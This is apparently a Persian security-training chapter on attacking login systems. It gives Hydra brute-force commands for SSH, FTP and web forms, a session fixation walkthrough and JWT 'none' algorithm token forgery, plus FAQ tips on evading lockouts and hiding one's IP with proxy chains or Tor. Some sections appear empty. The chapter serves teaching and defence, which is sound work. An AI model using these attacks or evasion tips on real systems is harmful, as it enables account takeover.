۱. جعبه عنوان و هویت

📖 عنوان کامل فصل: حمله به احراز هویت (Authentication Attacks) — کالبدشکافی دروازه ورود اپلیکیشن، از حدس رمز تا دور زدن MFA و سرقت نشست.

🎓 سطح دشواری: متوسط. پیش‌نیاز: فصل ۱ تا ۴ کامل + آشنایی با HTTP (هدر، کوکی، وضعیت) + Burp Suite نصب و تنظیم‌شده روی Firefox Kali.

⏱ زمان مطالعه: ۱۰۰ تا ۱۳۰ دقیقه (بدون احتساب اجرای کامل Brute Force که ممکن است ۱-۳ ساعت طول بکشد).

🎯 اهداف کلان این فصل:
  1. درک تفاوت Authentication (هویت‌سنجی) از Authorization (اختیاردهی) و چرا اولی هدف اول مهاجم است.
  2. اجرای Brute Force و Password Spraying با Hydra، Medusa و Burp Intruder.
  3. شکستن کامل Session Management — از کوکی ضعیف تا Session Fixation.
  4. دور زدن MFA/2FA با ۶ تکنیک واقعی (بدون نیاز به کد قربانی).
  5. حمله به JWT — از None Algorithm تا Key Confusion.
  6. سوءاستفاده از Password Reset و Account Recovery ضعیف.
  7. پیاده‌سازی دفاع در Django: Rate Limiting، Lockout، JWT امن، Session Hardening.
📚 خروجی قابل اندازه‌گیری (پس از این فصل):
  • موفقیت در Brute Force روی DVWA (با wordlist کوچک) و مستندسازی.

  • فهمیدن و نشان دادن ۳ تکنیک دور زدن MFA روی یک اپ ساده.
  • ساخت نسخه آسیب‌پذیر و نسخه امن Django برای Login + JWT.

🛠 حمله ۱: Brute Force با Hydra

کاربرد: سریع‌ترین ابزار CLI برای حمله به فرم‌های لاگین

۱) ساختار پایه Hydra:
# ساختار کلی:
hydra -l USERNAME -P WORDLIST [-s PORT] TARGET PROTOCOL [OPTIONS]

# حمله به SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20

# حمله به FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.20

# حمله به فرم لاگین HTTP POST
hydra -l admin -P rockyou.txt 192.168.56.20 \
    http-post-form "/login/:username=^USER^&password=^PASS^:F=Invalid"

# حمله با نام کاربری از یک لیست
hydra -L users.txt -P rockyou.txt ssh://192.168.56.20

۳) گزینه‌های مفید Hydra:
-l USER    # یک نام کاربری مشخص
-L FILE    # لیست نام‌های کاربری
-p PASS    # یک رمز مشخص
-P FILE    # لیست رمزها
-t TASKS   # تعداد رشته موازی (پیش‌فرض 16)
-V         # نمایش هر تلاش (verbose)
-f         # توقف در اولین رمز صحیح (fast)
-o FILE    # ذخیره نتایج
-s PORT    # پورت مشخص
-e nsr     # try null password / same as login / reverse
-I         # نادیده گرفتن خطای درخواست قبل

🛠 حمله ۲: Burp Suite Intruder (دقیق‌تر)

🛠 حمله ۳: Session Hijacking و Session Fixation

کاربرد: دزدیدن یا تحمیل Session ID برای تصاحب نشست قربانی

۱) تشخیص کوکی نشست ضعیف:

Set-Cookie: sessionid=a3f9d8b2e1c4...; HttpOnly; Secure; SameSite=Strict; path=/
۲) حمله Session Fixation:
1. مهاجم به سایت می‌رود، Session ID می‌گیرد: SID=A

2. مهاجم لینک آلوده می‌سازد:
   http://target.com/login?SID=A

3. قربانی روی لینک کلیک می‌کند و وارد سایت می‌شود

4. سرور، Session ID قربانی را تغییر نمی‌دهد (باگ!)
   → همان SID=A می‌ماند

5. مهاجم با SID=A از Session قربانی استفاده می‌کند
۳) حمله Session Hijacking از طریق XSS:

🛠 حمله ۵: JWT Attacks (None Algorithm + Key Confusion)

کاربرد: دستکاری توکن احراز هویت مبتنی بر JSON Web Token

۱) ساختار JWT:
# JWT از سه بخش تشکیل شده که با نقطه جدا می‌شوند:
# HEADER.PAYLOAD.SIGNATURE

{"alg": "HS256", "typ": "JWT"}

# Payload (Base64-decoded):

# ۱) Header را به none تغییر دهید:

# ۲) Payload را به user=admin تغییر دهید
{"user": "admin", "exp": 1700000000}

# ۳) Signature را حذف کنید (نقطه آخر بماند):

۱۰. پرسش و پاسخ و رفع اشکال

❓ سوالات متداول این فصل:
تفاوت Brute Force با Password Spraying چیست؟ کدام بهتر است؟

Brute Force: یک نام کاربری، هزاران رمز → سریع قفل می‌شود اگر Lockout فعال باشد.
Password Spraying: هزاران نام کاربری، یک رمز رایج → Lockout را دور می‌زند.
توصیه: اول Spraying (کم noisy، کمتر detect)، بعد اگر جواب نداد، Brute Force روی کاربران مهم.

چرا Django Admin با Hydra کار نمی‌کند؟

Django Admin از CSRF Token استفاده می‌کند و Hydra نمی‌تواند Token را استخراج کند. سه راه‌حل:
۱) از Burp Intruder با Session Handling Rules استفاده کنید
۲) یک endpoint لاگین ساده بدون CSRF بسازید (فقط در lab)
۳) از ابزارهایی مثل patator یا اسکریپت Python سفارشی که Token را استخراج کند

چرا پیام «Too many attempts» می‌گیرم؟

Rate Limit یا Lockout فعال است. راه‌حل‌ها:
• سرعت Hydra را کاهش دهید: -t 1 -W 5
• بین تلاش‌ها Delay اضافه کنید
• از Proxy Chain استفاده کنید
• بعد از Lockout، ۳۰ دقیقه صبر کنید یا Snapshot را برگردانید

حمله JWT به اپلیکیشن من کار نمی‌کند. چرا؟

سه دلیل رایج:
• سرور شما whitelist Algorithms دارد (خوب است!)
• از HS256 با کلید قوی استفاده می‌کنید (کشف نشدنی)
• KID header وجود ندارد (پس KID Injection کار نمی‌کند)
راه‌حل: کد سرور را بررسی کنید، یا از jwt_tool -M at برای تحلیل خودکار استفاده کنید.

چطور از IP خودم محافظت کنم در Brute Force؟

ابتدا از قانونی بودن هدف مطمئن شوید. سپس:
• از VPN یا Tor استفاده کنید (کند می‌شود)
• از Proxy Chain چرخشی استفاده کنید
• اگر روی lab خودتان هستید، IP واقعی مشکلی ندارد
• از User-Agent و هدرهای واقعی مرورگر استفاده کنید

MFA رو چطور برای اپ خودم امن کنم؟

چک‌لیست:
• MFA را در هر درخواست محافظت‌شده چک کنید (نه فقط در login)
• Rate Limit روی endpoint OTP (5 درخواست در دقیقه)
• OTP یک‌بار مصرف باشد (TOTP استاندارد)
• از Push Notification با Number Matching استفاده کنید (MFA Fatigue نمی‌گیرد)
• Recovery Codes را طولانی (32+ char) و یک‌بار مصرف کنید
• لاگ همه MFA events + Alert روی موارد مشکوک

🐛 خطاهای رایج و رفع آن‌ها:
خطا / مشکلعلتراه‌حل
hydra: unknown service نام سرویس اشتباه یا ماژول نصب نیست hydra -U <service> را چک کنید

📝 آزمونک فصل (۵ سؤال):
۱. Password Spraying چطور Lockout را دور می‌زند؟
  • الف) رمز را از دیتابیس می‌خواند
  • ب) از یک رمز روی چند نام کاربری استفاده می‌کند (Lockout روی نام کاربری است نه IP)
  • ج) CAPTCHA را دور می‌زند
  • د) همیشه جواب می‌دهد
۲. کدام کوکی از XSS در امان است؟
  • الف) HttpOnly
  • ب) Secure
  • ج) SameSite
  • د) همه موارد
۳. حمله «None Algorithm» روی JWT چه می‌کند؟
  • الف) امضا را از بین می‌برد
  • ب) Payload را حذف می‌کند
  • ج) Header را به alg:none تغییر می‌دهد (و سرور اشتباهاً قبول می‌کند)
  • د) JWT را طولانی‌تر می‌کند
۴. کدام دفاع مؤثرترین است در برابر Brute Force؟
  • الف) رمز طولانی
  • ب) ترکیب Rate Limiting + Account Lockout + CAPTCHA + 2FA
  • ج) تغییر پورت SSH
  • د) استفاده از HTTPS
۵. حمله MFA Fatigue چیست؟
  • الف) حدس زدن کد ۶ رقمی
  • ب) ارسال مکرر درخواست تأیید تا قربانی از خستگی Accept کند
  • ج) دزدیدن کد از پیامک
  • د) دور زدن با Response Manipulation
✅ پاسخ‌های صحیح

۱. ب — Password Spraying روی نام‌های کاربری زیاد با رمز کم کار می‌کند و چون هر اکانت فقط ۱-۲ تلاش می‌گیرد، Lockout فعال نمی‌شود.

۲. الف — HttpOnly کوکی را از JavaScript مخفی می‌کند؛ XSS نمی‌تواند آن را بخواند.

۳. ج — حمله None Algorithm با تغییر alg به none و حذف امضا، اگر سرور whitelist نداشته باشد، توکن را قبول می‌کند.

۴. ب — ترکیب چندلایه مؤثرترین است (هیچ لایه‌ای تنها کافی نیست).

۵. ب — MFA Fatigue (یا Push Bombing) با اسپم کردن درخواست MFA، قربانی را خسته می‌کند تا Accept بزند.
